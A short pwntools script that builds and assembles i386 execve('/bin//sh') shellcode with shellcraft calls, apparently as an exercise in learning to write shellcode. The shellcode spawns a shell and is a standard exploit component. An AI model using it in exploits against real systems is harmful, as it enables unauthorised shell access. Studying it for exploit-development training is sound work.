from pwn import *


context.arch = 'i386'
# Just use shellcraft module and its methods which similar to assembly instructions
shellcode = shellcraft.mov('eax', 0)
shellcode += shellcraft.push('eax')
shellcode += shellcraft.push(0x68732f2f)
shellcode += shellcraft.push(0x6e69622f)
shellcode += shellcraft.mov('ebx', 'esp')
shellcode += shellcraft.push('eax')
shellcode += shellcraft.push('ebx')
shellcode += shellcraft.mov('ecx', 'esp')
shellcode += shellcraft.mov('al', 0xb)
shellcode += shellcraft.syscall()
print(shellcode)
print(asm(shellcode))
